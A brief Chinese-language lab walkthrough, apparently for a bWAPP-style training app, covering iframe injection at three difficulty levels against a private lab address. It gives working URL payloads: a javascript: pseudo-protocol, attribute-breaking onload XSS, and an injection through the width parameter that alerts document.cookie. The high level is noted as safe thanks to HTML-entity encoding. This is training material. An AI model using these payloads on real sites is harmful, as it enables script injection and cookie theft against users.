# iFrame 注入

## low

通过修改注入处参数ParamUrl进行控制

可以直接用来访问网站或读取本地文件

```
URl转跳
http://192.168.0.108/iframei.php?ParamUrl=https://www.baidu.com&ParamWidth=250&ParamHeight=250
js伪协议
http://192.168.0.108/iframei.php?ParamUrl=javascript:alert(111)&ParamWidth=250&ParamHeight=250
闭合注入xss
http://192.168.0.108/iframei.php?ParamUrl=" onload="alert(1)&ParamWidth=250&ParamHeight=250kkk
```

## medium

中级别难度中我们可以通过看源码发现新增了防护,ParamUrl被写死,对反斜杠做了转义,这时我们可以把目光放到后半部分

利用方法

http://192.168.0.108/iframei.php?ParamUrl=robots.txt&ParamWidth=800" onload=alert(document.cookie) //&ParamHeight=800

## high 

高级别转化为HTML实体,且参数正确,安全
